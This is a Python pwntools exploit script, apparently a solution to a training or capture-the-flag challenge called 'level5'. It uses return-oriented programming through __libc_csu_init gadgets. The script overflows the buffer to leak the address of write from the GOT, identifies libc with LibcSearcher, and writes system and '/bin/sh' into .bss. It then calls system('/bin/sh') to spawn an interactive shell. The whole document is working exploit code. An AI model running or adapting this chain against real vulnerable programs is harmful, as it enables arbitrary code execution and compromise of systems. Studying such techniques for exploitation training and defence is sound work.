#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
context.arch = 'amd64'
# context.log_level = 'debug'
p = process('./level5')
elf = ELF('./level5')
write_got = elf.got['write']
read_got = elf.got['read']
main_addr = elf.symbols['main']
bss_base = elf.bss()
log.success('write_got = ' + hex(write_got))
log.success('read_got = ' + hex(read_got))
log.success('main_addr = ' + hex(main_addr))
log.success('bss_base = ' + hex(bss_base))
csu_front_addr = 0x400600
csu_end_addr = 0x40061A
# gdb.attach(p)

#  400600:       4c 89 ea                mov    rdx,r13
#  400603:       4c 89 f6                mov    rsi,r14
#  400606:       44 89 ff                mov    edi,r15d
#  400609:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
#  40060d:       48 83 c3 01             add    rbx,0x1
#  400611:       48 39 eb                cmp    rbx,rbp
#  400614:       75 ea                   jne    400600 <__libc_csu_init+0x40>
#  400616:       48 83 c4 08             add    rsp,0x8
#  40061a:       5b                      pop    rbx
#  40061b:       5d                      pop    rbp
#  40061c:       41 5c                   pop    r12
#  40061e:       41 5d                   pop    r13
#  400620:       41 5e                   pop    r14
#  400622:       41 5f                   pop    r15
#  400624:       c3                      ret
def csu(rbx, rbp, r12, r13, r14, r15, ret_addr):
	# rbx == 0 and rbp == 1, enable not to jump
	# r12 should be the function we want to call
	# rdi = edi = r15d
	# rsi = r14
	# rdx = r13
	# args: rdi, rsi, rdx, rcx, r8, r9, stack
	payload = flat([
		'\x00' * 136, 
		csu_end_addr, rbx, rbp, r12, r13, r14, r15, 
		csu_front_addr, 
		'\x00' * 56, 
		ret_addr
	])
	p.recvuntil('Hello, World\n')
	p.send(payload)
	sleep(1)

print '>>> write(STDOUT_FILENO, write_got, 8); <<<'
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(p.recv(8).ljust(8, '\x00'))
log.success('write_addr = ' + hex(write_addr))
libc = LibcSearcher('write', write_addr)
print '>>> SEARCHING FOR LIBC <<<'
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
system_addr = libc_base + libc.dump('system')
log.success('libc_base = ' + hex(libc_base))
log.success('execve_addr = ' + hex(execve_addr))
log.success('system_addr = ' + hex(system_addr))

print '>>> read(STDIN_FILENO, bss_base, 16); <<<'
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
payload = flat([system_addr, '/bin/sh\x00'])
p.send(payload)

print '>>> system("/bin/sh"); OR execve("/bin/sh"); <<<'
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
p.interactive()
